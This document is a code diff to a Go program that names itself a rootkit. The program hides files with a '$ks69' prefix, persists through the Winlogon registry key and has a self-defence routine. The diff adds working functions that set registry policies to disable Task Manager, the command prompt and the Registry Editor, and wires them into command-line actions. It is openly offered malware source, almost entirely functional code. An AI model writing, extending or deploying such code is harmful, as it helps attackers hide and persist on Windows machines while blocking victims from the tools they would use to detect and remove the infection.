@@ -160,25 +160,166 @@ func removeFromWinlogon() error {
 	return nil
 }
 
+// Отключение и включение Диспетчера задач
+func disableTaskManager() error {
+	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+	if err != nil {
+		// Если ключ не существует, создаем его
+		key, _, err = registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+		if err != nil {
+			return fmt.Errorf("failed to create registry key: %v", err)
+		}
+	}
+	defer key.Close()
+
+	// Устанавливаем значение DisableTaskMgr = 1
+	err = key.SetDWordValue("DisableTaskMgr", 1)
+	if err != nil {
+		return fmt.Errorf("failed to set DisableTaskMgr value: %v", err)
+	}
+
+	fmt.Println("Task Manager disabled.")
+	return nil
+}
+
+func enableTaskManager() error {
+	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+	if err != nil {
+		return fmt.Errorf("failed to open registry key: %v", err)
+	}
+	defer key.Close()
+
+	// Удаляем значение DisableTaskMgr
+	err = key.DeleteValue("DisableTaskMgr")
+	if err != nil {
+		return fmt.Errorf("failed to delete DisableTaskMgr value: %v", err)
+	}
+
+	fmt.Println("Task Manager enabled.")
+	return nil
+}
+
+// Отключение и включение Командной строки (CMD)
+func disableCMD() error {
+	keyPath := `SOFTWARE\Policies\Microsoft\Windows\System`
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+	if err != nil {
+		// Если ключ не существует, создаем его
+		key, _, err = registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+		if err != nil {
+			return fmt.Errorf("failed to create registry key: %v", err)
+		}
+	}
+	defer key.Close()
+
+	// Устанавливаем значение DisableCMD = 1
+	err = key.SetDWordValue("DisableCMD", 1)
+	if err != nil {
+		return fmt.Errorf("failed to set DisableCMD value: %v", err)
+	}
+
+	fmt.Println("CMD disabled.")
+	return nil
+}
+
+func enableCMD() error {
+	keyPath := `SOFTWARE\Policies\Microsoft\Windows\System`
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+	if err != nil {
+		return fmt.Errorf("failed to open registry key: %v", err)
+	}
+	defer key.Close()
+
+	// Удаляем значение DisableCMD
+	err = key.DeleteValue("DisableCMD")
+	if err != nil {
+		return fmt.Errorf("failed to delete DisableCMD value: %v", err)
+	}
+
+	fmt.Println("CMD enabled.")
+	return nil
+}
+
+// Отключение и включение Редактора реестра
+func disableRegistryEditor() error {
+	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+	if err != nil {
+		// Если ключ не существует, создаем его
+		key, _, err = registry.CreateKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+		if err != nil {
+			return fmt.Errorf("failed to create registry key: %v", err)
+		}
+	}
+	defer key.Close()
+
+	// Устанавливаем значение DisableRegistryTools = 1
+	err = key.SetDWordValue("DisableRegistryTools", 1)
+	if err != nil {
+		return fmt.Errorf("failed to set DisableRegistryTools value: %v", err)
+	}
+
+	fmt.Println("Registry Editor disabled.")
+	return nil
+}
+
+func enableRegistryEditor() error {
+	keyPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`
+
+	key, err := registry.OpenKey(registry.CURRENT_USER, keyPath, registry.ALL_ACCESS)
+	if err != nil {
+		return fmt.Errorf("failed to open registry key: %v", err)
+	}
+	defer key.Close()
+
+	// Удаляем значение DisableRegistryTools
+	err = key.DeleteValue("DisableRegistryTools")
+	if err != nil {
+		return fmt.Errorf("failed to delete DisableRegistryTools value: %v", err)
+	}
+
+	fmt.Println("Registry Editor enabled.")
+	return nil
+}
+
 func main() {
 	if !SelfDefense() {
 		fmt.Println("SelfDefense failed, but continuing execution...")
 	}
 
-	if len(os.Args) < 3 {
+	if len(os.Args) < 2 {
 		fmt.Println("This rootkit hides files and folders with the '$ks69' prefix!")
 		fmt.Println("Usage:")
 		fmt.Println("  rootkit <path> <show|hide>")
 		fmt.Println("  rootkit <programPath> winlogon")
 		fmt.Println("  rootkit unwinlogon")
+		fmt.Println("  rootkit disabletaskmgr")
+		fmt.Println("  rootkit enabletaskmgr")
+		fmt.Println("  rootkit disablecmd")
+		fmt.Println("  rootkit enablecmd")
+		fmt.Println("  rootkit disableregistry")
+		fmt.Println("  rootkit enableregistry")
 		return
 	}
 
-	action := os.Args[2] // Действие теперь второй аргумент
-	rootDir := os.Args[1] // Путь теперь первый аргумент
+	action := os.Args[1]
 
 	switch action {
 	case "show", "hide":
+		if len(os.Args) != 3 {
+			fmt.Println("Usage: rootkit <path> <show|hide>")
+			return
+		}
+
+		rootDir := os.Args[2]
+
 		err := filepath.WalkDir(rootDir, func(path string, dirEntry os.DirEntry, err error) error {
 			if err != nil {
 				fmt.Printf("Error accessing path %s: %v\n", path, err)
@@ -215,7 +356,7 @@ func main() {
 			return
 		}
 
-		programPath := os.Args[1]
+		programPath := os.Args[2]
 		if err := addToWinlogon(programPath); err != nil {
 			log.Fatalf("Failed to add to Winlogon: %v", err)
 		}
@@ -230,7 +371,37 @@ func main() {
 			log.Fatalf("Failed to remove from Winlogon: %v", err)
 		}
 
+	case "disabletaskmgr":
+		if err := disableTaskManager(); err != nil {
+			log.Fatalf("Failed to disable Task Manager: %v", err)
+		}
+
+	case "enabletaskmgr":
+		if err := enableTaskManager(); err != nil {
+			log.Fatalf("Failed to enable Task Manager: %v", err)
+		}
+
+	case "disablecmd":
+		if err := disableCMD(); err != nil {
+			log.Fatalf("Failed to disable CMD: %v", err)
+		}
+
+	case "enablecmd":
+		if err := enableCMD(); err != nil {
+			log.Fatalf("Failed to enable CMD: %v", err)
+		}
+
+	case "disableregistry":
+		if err := disableRegistryEditor(); err != nil {
+			log.Fatalf("Failed to disable Registry Editor: %v", err)
+		}
+
+	case "enableregistry":
+		if err := enableRegistryEditor(); err != nil {
+			log.Fatalf("Failed to enable Registry Editor: %v", err)
+		}
+
 	default:
-		fmt.Println("Invalid action. Use 'show', 'hide', 'winlogon', or 'unwinlogon'.")
+		fmt.Println("Invalid action. Use 'show', 'hide', 'winlogon', 'unwinlogon', 'disabletaskmgr', 'enabletaskmgr', 'disablecmd', 'enablecmd', 'disableregistry', or 'enableregistry'.")
 	}
 }
